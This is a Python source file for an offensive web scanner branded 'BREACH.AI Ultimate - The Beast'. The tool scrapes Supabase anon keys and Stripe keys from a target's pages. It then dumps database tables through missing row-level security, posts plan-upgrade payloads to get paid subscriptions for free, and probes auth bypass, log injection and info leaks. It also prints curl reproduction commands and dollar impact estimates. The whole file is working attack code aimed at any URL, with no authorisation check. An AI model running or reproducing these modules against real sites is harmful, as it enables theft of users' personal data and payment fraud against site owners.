#!/usr/bin/env python3
"""
BREACH.AI Ultimate - The Beast

Unified engine that:
1. Fingerprints the target (stack detection)
2. Runs ALL relevant attacks based on stack
3. Chains findings automatically
4. Calculates business impact in dollars
5. Generates proof-of-concept exploits
"""

import asyncio
import aiohttp
import json
import sys
import os
import re
import time
import base64
import hashlib
import hmac
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Set, Tuple
from urllib.parse import urlparse, urljoin
from datetime import datetime
from enum import Enum

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()


class Severity(Enum):
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1
    INFO = 0


@dataclass
class BusinessImpact:
    """Calculate real business impact."""

    @staticmethod
    def calculate(finding_type: str, details: Dict) -> Tuple[int, str]:
        if finding_type == "data_leak":
            records = details.get('records', 1)
            has_pii = details.get('has_pii', False)
            if has_pii:
                cost = records * 150 + 50000
                explanation = f"{records} records x $150 (GDPR) + $50K breach response"
            else:
                cost = records * 50 + 10000
                explanation = f"{records} records x $50 + $10K response"
            return cost, explanation

        elif finding_type == "payment_bypass":
            plan_cost = details.get('plan_cost', 99)
            estimated_abusers = details.get('estimated_abusers', 100)
            cost = plan_cost * estimated_abusers * 12
            explanation = f"${plan_cost}/mo x {estimated_abusers} abusers x 12 months"
            return cost, explanation

        elif finding_type == "admin_access":
            return 100000, "Full system compromise"

        elif finding_type == "auth_bypass":
            return 25000, "Unauthorized access to protected resources"

        else:
            return 5000, "Security incident response"


@dataclass
class StackFingerprint:
    """Detected technology stack."""
    framework: Optional[str] = None
    auth_provider: Optional[str] = None
    database: Optional[str] = None
    payment_provider: Optional[str] = None
    hosting: Optional[str] = None
    supabase_url: Optional[str] = None
    supabase_anon_key: Optional[str] = None
    stripe_pk: Optional[str] = None


@dataclass
class Finding:
    """A security finding."""
    severity: Severity
    category: str
    title: str
    description: str
    endpoint: str
    method: str
    evidence: Any = None
    records_exposed: int = 0
    pii_fields: List[str] = field(default_factory=list)
    business_impact: int = 0
    impact_explanation: str = ""
    curl_command: str = ""
    fix_suggestion: str = ""


class StackDetector:
    """Detect technology stack from responses."""

    PATTERNS = {
        'next.js': [r'_next/static', r'__NEXT_DATA__', r'next-auth', r'/_next/'],
        'react': [r'react', r'__REACT'],
        'nextauth': [r'/api/auth/session', r'/api/auth/csrf', r'next-auth', r'__Secure-next-auth'],
        'supabase': [r'supabase\.co', r'\.supabase\.'],
        'firebase': [r'firebaseio\.com', r'firebase\.google'],
        'stripe': [r'stripe\.com', r'pk_live_', r'pk_test_'],
        'razorpay': [r'razorpay', r'rzp_'],
        'vercel': [r'vercel', r'\.vercel\.app'],
    }

    SECRET_PATTERNS = {
        'supabase_url': re.compile(r'https://[a-z0-9]+\.supabase\.co'),
        'supabase_anon_key': re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'),
        'stripe_pk': re.compile(r'pk_(?:live|test)_[a-zA-Z0-9]+'),
    }

    @classmethod
    async def detect(cls, session: aiohttp.ClientSession, base_url: str) -> StackFingerprint:
        fingerprint = StackFingerprint()

        pages = ['/', '/api/health', '/api/auth/session', '/api/auth/providers']
        all_content = ""

        for page in pages:
            url = urljoin(base_url, page)
            try:
                async with session.get(url, ssl=False, timeout=10) as resp:
                    content = await resp.text()
                    all_content += content + str(resp.headers)
            except:
                pass

        content_lower = all_content.lower()

        # Framework
        if any(re.search(p, content_lower) for p in cls.PATTERNS['next.js']):
            fingerprint.framework = 'next.js'

        # Auth
        if any(re.search(p, content_lower) for p in cls.PATTERNS['nextauth']):
            fingerprint.auth_provider = 'nextauth'

        # Database
        if any(re.search(p, content_lower) for p in cls.PATTERNS['supabase']):
            fingerprint.database = 'supabase'
        elif any(re.search(p, content_lower) for p in cls.PATTERNS['firebase']):
            fingerprint.database = 'firebase'

        # Payments
        if any(re.search(p, content_lower) for p in cls.PATTERNS['stripe']):
            fingerprint.payment_provider = 'stripe'
        elif any(re.search(p, content_lower) for p in cls.PATTERNS['razorpay']):
            fingerprint.payment_provider = 'razorpay'

        # Hosting
        if any(re.search(p, content_lower) for p in cls.PATTERNS['vercel']):
            fingerprint.hosting = 'vercel'

        # Extract secrets
        for secret_name, pattern in cls.SECRET_PATTERNS.items():
            matches = pattern.findall(all_content)
            if matches:
                setattr(fingerprint, secret_name, matches[0])

        return fingerprint


class AttackModule:
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.findings: List[Finding] = []

    async def run(self, base_url: str, fingerprint: StackFingerprint, cookies: Dict = None, headers: Dict = None) -> List[Finding]:
        raise NotImplementedError


class SupabaseRLSAttack(AttackModule):
    """Test Supabase Row Level Security bypass."""

    TABLES = ['users', 'profiles', 'accounts', 'projects', 'documents', 'orders', 'payments', 'teams', 'messages']

    async def run(self, base_url: str, fingerprint: StackFingerprint, cookies: Dict = None, headers: Dict = None) -> List[Finding]:
        if not fingerprint.supabase_url or not fingerprint.supabase_anon_key:
            return []

        console.print(f"\n[yellow]⚡ SUPABASE RLS ATTACK[/yellow]")

        supabase_headers = {
            'apikey': fingerprint.supabase_anon_key,
            'Authorization': f'Bearer {fingerprint.supabase_anon_key}',
        }

        total_records = 0
        vulnerable_tables = []

        for table in self.TABLES:
            url = f"{fingerprint.supabase_url}/rest/v1/{table}?select=*&limit=100"

            try:
                async with self.session.get(url, headers=supabase_headers, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        try:
                            data = json.loads(body)
                            if isinstance(data, list) and len(data) > 0:
                                record_count = len(data)
                                total_records += record_count

                                pii = self._detect_pii(data[0])
                                vulnerable_tables.append({'table': table, 'records': record_count, 'pii': pii})

                                console.print(f"[red]  🔴 {table}[/red] → {record_count} records" + (f" [PII: {', '.join(pii)}]" if pii else ""))
                        except:
                            pass
            except:
                pass

        if vulnerable_tables:
            impact, explanation = BusinessImpact.calculate('data_leak', {
                'records': total_records,
                'has_pii': any(t['pii'] for t in vulnerable_tables)
            })

            self.findings.append(Finding(
                severity=Severity.CRITICAL,
                category="supabase_rls",
                title=f"Supabase RLS Bypass - {total_records} Records Exposed",
                description=f"Row Level Security not enabled. {len(vulnerable_tables)} tables accessible.",
                endpoint=fingerprint.supabase_url,
                method="GET",
                evidence={'tables': vulnerable_tables},
                records_exposed=total_records,
                pii_fields=list(set(p for t in vulnerable_tables for p in t['pii'])),
                business_impact=impact,
                impact_explanation=explanation,
                curl_command=f"curl '{fingerprint.supabase_url}/rest/v1/users?select=*' -H 'apikey: {fingerprint.supabase_anon_key[:20]}...'",
                fix_suggestion="Enable RLS: ALTER TABLE users ENABLE ROW LEVEL SECURITY;"
            ))

        return self.findings

    def _detect_pii(self, record: Dict) -> List[str]:
        pii = []
        pii_keywords = ['email', 'phone', 'password', 'address', 'ssn', 'name', 'card']
        for key in record.keys():
            for kw in pii_keywords:
                if kw in key.lower():
                    pii.append(key)
        return pii


class PaymentBypassAttack(AttackModule):
    """Test payment/subscription bypass."""

    async def run(self, base_url: str, fingerprint: StackFingerprint, cookies: Dict = None, headers: Dict = None) -> List[Finding]:
        if not cookies:
            return []

        console.print(f"\n[yellow]⚡ PAYMENT BYPASS ATTACK[/yellow]")

        endpoints = ['/api/user/subscription', '/api/subscription', '/api/billing/plan', '/api/upgrade']
        payloads = [
            {"subscriptionPlan": "PRO"},
            {"subscriptionPlan": "PREMIUM"},
            {"plan": "pro"},
        ]

        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)

            for payload in payloads:
                try:
                    async with self.session.post(url, cookies=cookies, json=payload, ssl=False, timeout=10) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            try:
                                data = json.loads(body)
                                response_str = body.lower()

                                if any(p in response_str for p in ['pro', 'premium', 'enterprise']):
                                    impact, explanation = BusinessImpact.calculate('payment_bypass', {'plan_cost': 99, 'estimated_abusers': 100})

                                    console.print(f"[red bold]  🔴 PAYMENT BYPASS[/red bold] {endpoint}")

                                    self.findings.append(Finding(
                                        severity=Severity.CRITICAL,
                                        category="payment_bypass",
                                        title=f"Payment Bypass - Free Subscription Upgrade",
                                        description=f"POST to {endpoint} upgrades subscription without payment",
                                        endpoint=endpoint,
                                        method="POST",
                                        evidence={'payload': payload, 'response': data},
                                        business_impact=impact,
                                        impact_explanation=explanation,
                                        curl_command=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
                                        fix_suggestion="Verify payment via Stripe webhook before updating subscription"
                                    ))
                                    return self.findings
                            except:
                                pass
                except:
                    pass

        return self.findings


class AuthBypassAttack(AttackModule):
    """Test authentication bypass patterns."""

    async def run(self, base_url: str, fingerprint: StackFingerprint, cookies: Dict = None, headers: Dict = None) -> List[Finding]:
        console.print(f"\n[yellow]⚡ AUTH BYPASS ATTACK[/yellow]")

        endpoints = ['/api/projects', '/api/users', '/api/payments', '/api/orders', '/api/admin', '/api/documents']

        for endpoint in endpoints:
            base_endpoint_url = urljoin(base_url, endpoint)

            try:
                async with self.session.get(base_endpoint_url, ssl=False, timeout=10) as resp:
                    base_status = resp.status
            except:
                continue

            if base_status != 401:
                continue

            test_ids = ['1', 'test', 'admin', '00000000-0000-0000-0000-000000000001']

            for test_id in test_ids:
                id_url = f"{base_endpoint_url}/{test_id}"

                try:
                    async with self.session.get(id_url, ssl=False, timeout=10) as resp:
                        id_status = resp.status

                        if id_status == 404:
                            console.print(f"[red]  🔴 AUTH BYPASS: {endpoint}/{{id}}[/red]")

                            self.findings.append(Finding(
                                severity=Severity.HIGH,
                                category="auth_bypass",
                                title=f"Auth Middleware Bypass - {endpoint}/{{id}}",
                                description=f"Auth not applied to parameterized route. {endpoint}→401, {endpoint}/{{id}}→404",
                                endpoint=f"{endpoint}/{{id}}",
                                method="GET",
                                business_impact=25000,
                                impact_explanation="Middleware routing vulnerability",
                                curl_command=f"curl '{base_endpoint_url}' # 401\ncurl '{id_url}' # 404",
                                fix_suggestion="Apply auth middleware to all routes including dynamic segments"
                            ))
                            break

                        elif id_status == 200:
                            body = await resp.text()
                            if len(body) > 100:
                                console.print(f"[red bold]  🔴 UNAUTH DATA ACCESS: {endpoint}/{test_id}[/red bold]")

                                self.findings.append(Finding(
                                    severity=Severity.CRITICAL,
                                    category="auth_bypass",
                                    title=f"Unauthenticated Data Access - {endpoint}",
                                    description=f"Data accessible without authentication",
                                    endpoint=f"{endpoint}/{test_id}",
                                    method="GET",
                                    business_impact=50000,
                                    impact_explanation="Complete auth bypass with data access",
                                    curl_command=f"curl '{id_url}'"
                                ))
                                break
                except:
                    pass

        return self.findings


class LogInjectionAttack(AttackModule):
    """Test log injection vulnerabilities."""

    async def run(self, base_url: str, fingerprint: StackFingerprint, cookies: Dict = None, headers: Dict = None) -> List[Finding]:
        console.print(f"\n[yellow]⚡ LOG INJECTION ATTACK[/yellow]")

        log_endpoints = ['/api/auth/_log', '/api/log', '/api/logs', '/api/analytics']

        payloads = [
            {"message": "test_injection"},
            {"level": "info", "message": "fake_admin_login"},
            {"type": "error", "data": {"user": "attacker"}},
        ]

        for endpoint in log_endpoints:
            url = urljoin(base_url, endpoint)

            for payload in payloads:
                try:
                    async with self.session.post(url, json=payload, ssl=False, timeout=10) as resp:
                        if resp.status == 200:
                            console.print(f"[red]  🔴 LOG INJECTION: {endpoint}[/red]")

                            self.findings.append(Finding(
                                severity=Severity.MEDIUM,
                                category="log_injection",
                                title=f"Log Injection - {endpoint}",
                                description=f"Endpoint accepts arbitrary log data - potential log poisoning",
                                endpoint=endpoint,
                                method="POST",
                                evidence={'payload': payload},
                                business_impact=10000,
                                impact_explanation="Log poisoning, potential XSS in admin panels",
                                curl_command=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
                                fix_suggestion="Validate and sanitize log input, require authentication"
                            ))
                            return self.findings
                except:
                    pass

        return self.findings


class InfoDisclosureAttack(AttackModule):
    """Test information disclosure."""

    async def run(self, base_url: str, fingerprint: StackFingerprint, cookies: Dict = None, headers: Dict = None) -> List[Finding]:
        console.print(f"\n[yellow]⚡ INFO DISCLOSURE ATTACK[/yellow]")

        endpoints = ['/api/health', '/api/status', '/api/config', '/api/debug', '/api/info']

        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)

            try:
                async with self.session.get(url, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        body = await resp.text()

                        try:
                            data = json.loads(body)

                            sensitive_keys = ['database', 'db', 'memory', 'uptime', 'environment', 'env', 'version']
                            found_sensitive = []

                            def check_keys(obj, path=""):
                                if isinstance(obj, dict):
                                    for k, v in obj.items():
                                        full_path = f"{path}.{k}" if path else k
                                        if any(s in k.lower() for s in sensitive_keys):
                                            found_sensitive.append(full_path)
                                        check_keys(v, full_path)

                            check_keys(data)

                            if found_sensitive:
                                console.print(f"[yellow]  🟡 INFO LEAK: {endpoint}[/yellow] ({', '.join(found_sensitive[:3])})")

                                self.findings.append(Finding(
                                    severity=Severity.MEDIUM,
                                    category="info_disclosure",
                                    title=f"Information Disclosure - {endpoint}",
                                    description=f"Exposes: {', '.join(found_sensitive)}",
                                    endpoint=endpoint,
                                    method="GET",
                                    evidence=data,
                                    business_impact=5000,
                                    impact_explanation="System info exposure aids further attacks",
                                    curl_command=f"curl '{url}'",
                                    fix_suggestion="Restrict access or remove sensitive fields from response"
                                ))
                        except:
                            pass
            except:
                pass

        return self.findings


class BreachUltimate:
    """BREACH.AI Ultimate - The Beast"""

    def __init__(self, deep_mode: bool = False):
        self.deep_mode = deep_mode
        self.session: Optional[aiohttp.ClientSession] = None
        self.fingerprint: Optional[StackFingerprint] = None
        self.findings: List[Finding] = []
        self.start_time: float = 0

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={'User-Agent': 'BREACH.AI Ultimate/1.0'}
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def breach(self, target: str, cookie: str = None, token: str = None) -> List[Finding]:
        self.start_time = time.time()

        if not target.startswith('http'):
            target = f'https://{target}'

        cookies = {}
        if cookie:
            for part in cookie.split(';'):
                if '=' in part:
                    k, v = part.strip().split('=', 1)
                    cookies[k] = v

        headers = {}
        if token:
            headers['Authorization'] = token if token.startswith('Bearer') else f'Bearer {token}'

        self._print_banner(target)

        # Phase 1: Fingerprint
        console.print(f"\n[bold cyan]▶ PHASE 1: STACK FINGERPRINTING[/bold cyan]")
        self.fingerprint = await StackDetector.detect(self.session, target)
        self._print_fingerprint()

        # Phase 2: Attacks
        console.print(f"\n[bold cyan]▶ PHASE 2: TARGETED ATTACKS[/bold cyan]")

        attack_modules = [
            SupabaseRLSAttack(self.session),
            PaymentBypassAttack(self.session),
            AuthBypassAttack(self.session),
            LogInjectionAttack(self.session),
            InfoDisclosureAttack(self.session),
        ]

        for module in attack_modules:
            try:
                findings = await module.run(target, self.fingerprint, cookies, headers)
                self.findings.extend(findings)
            except Exception as e:
                console.print(f"[dim]  Error in {module.__class__.__name__}: {e}[/dim]")

        self._print_report()
        return self.findings

    def _print_banner(self, target: str):
        console.print(Panel.fit(
            "[bold red]BREACH.AI ULTIMATE[/bold red]\n"
            "[dim]The Beast - One Command. Every Attack.[/dim]\n\n"
            f"Target: {target}\n"
            f"Mode: {'Deep' if self.deep_mode else 'Standard'}",
            border_style="red"
        ))

    def _print_fingerprint(self):
        table = Table(box=box.ROUNDED, title="Stack Fingerprint")
        table.add_column("Component", style="cyan")
        table.add_column("Detected", style="green")

        table.add_row("Framework", self.fingerprint.framework or "Unknown")
        table.add_row("Auth", self.fingerprint.auth_provider or "Unknown")
        table.add_row("Database", self.fingerprint.database or "Unknown")
        table.add_row("Payments", self.fingerprint.payment_provider or "Unknown")
        table.add_row("Hosting", self.fingerprint.hosting or "Unknown")

        if self.fingerprint.supabase_url:
            table.add_row("Supabase URL", self.fingerprint.supabase_url[:50] + "...")
        if self.fingerprint.stripe_pk:
            table.add_row("Stripe Key", self.fingerprint.stripe_pk[:30] + "...")

        console.print(table)

    def _print_report(self):
        elapsed = time.time() - self.start_time

        console.print(f"\n{'═' * 70}")

        critical = len([f for f in self.findings if f.severity == Severity.CRITICAL])
        high = len([f for f in self.findings if f.severity == Severity.HIGH])
        medium = len([f for f in self.findings if f.severity == Severity.MEDIUM])

        total_impact = sum(f.business_impact for f in self.findings)

        if critical > 0:
            console.print(f"\n[bold red]🔴 {critical} CRITICAL VULNERABILITIES[/bold red]")
        if high > 0:
            console.print(f"[bold yellow]🟡 {high} HIGH SEVERITY[/bold yellow]")
        if medium > 0:
            console.print(f"[bold blue]🔵 {medium} MEDIUM SEVERITY[/bold blue]")

        if total_impact > 0:
            console.print(f"\n[bold]💰 ESTIMATED BUSINESS IMPACT: ${total_impact:,}[/bold]")

        console.print(f"{'═' * 70}\n")

        # Summary table
        table = Table(box=box.ROUNDED, title="Scan Summary")
        table.add_column("Metric", style="cyan")
        table.add_column("Value")

        table.add_row("Duration", f"{elapsed:.1f}s")
        table.add_row("Total Findings", str(len(self.findings)))
        table.add_row("Critical", f"[red]{critical}[/red]" if critical else "0")
        table.add_row("High", f"[yellow]{high}[/yellow]" if high else "0")
        table.add_row("Medium", f"[blue]{medium}[/blue]" if medium else "0")
        table.add_row("Business Impact", f"[bold]${total_impact:,}[/bold]")

        console.print(table)

        if self.findings:
            console.print(f"\n[bold]DETAILED FINDINGS:[/bold]")

            sorted_findings = sorted(self.findings, key=lambda f: f.severity.value, reverse=True)

            for i, f in enumerate(sorted_findings, 1):
                severity_color = {
                    Severity.CRITICAL: 'red bold',
                    Severity.HIGH: 'yellow',
                    Severity.MEDIUM: 'blue',
                    Severity.LOW: 'dim',
                    Severity.INFO: 'dim',
                }[f.severity]

                console.print(f"\n  {i}. [{severity_color}][{f.severity.name}][/{severity_color}] {f.title}")
                console.print(f"     {f.description}")

                if f.records_exposed:
                    console.print(f"     [red]Records Exposed: {f.records_exposed}[/red]")

                if f.pii_fields:
                    console.print(f"     [red]PII: {', '.join(f.pii_fields)}[/red]")

                console.print(f"     [green]💰 Impact: ${f.business_impact:,}[/green] - {f.impact_explanation}")
                console.print(f"     [dim]Reproduce: {f.curl_command[:100]}...[/dim]")

                if f.fix_suggestion:
                    console.print(f"     [cyan]Fix: {f.fix_suggestion}[/cyan]")

        console.print(f"\n{'═' * 70}\n")

    def generate_json_report(self) -> str:
        return json.dumps({
            'findings': [
                {
                    'severity': f.severity.name,
                    'category': f.category,
                    'title': f.title,
                    'description': f.description,
                    'endpoint': f.endpoint,
                    'records_exposed': f.records_exposed,
                    'business_impact': f.business_impact,
                    'curl_command': f.curl_command,
                    'fix_suggestion': f.fix_suggestion,
                }
                for f in self.findings
            ],
            'total_impact': sum(f.business_impact for f in self.findings),
            'critical_count': len([f for f in self.findings if f.severity == Severity.CRITICAL]),
        }, indent=2)


async def main():
    import argparse

    parser = argparse.ArgumentParser(description='BREACH.AI Ultimate - The Beast')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--cookie', help='Session cookie')
    parser.add_argument('--token', help='Bearer token')
    parser.add_argument('--deep', action='store_true', help='Deep scan mode')
    parser.add_argument('--output', help='Output file for JSON report')

    args = parser.parse_args()

    async with BreachUltimate(deep_mode=args.deep) as engine:
        findings = await engine.breach(
            target=args.target,
            cookie=args.cookie,
            token=args.token
        )

        if args.output:
            with open(args.output, 'w') as f:
                f.write(engine.generate_json_report())
            console.print(f"[green]Report saved to {args.output}[/green]")


if __name__ == '__main__':
    asyncio.run(main())
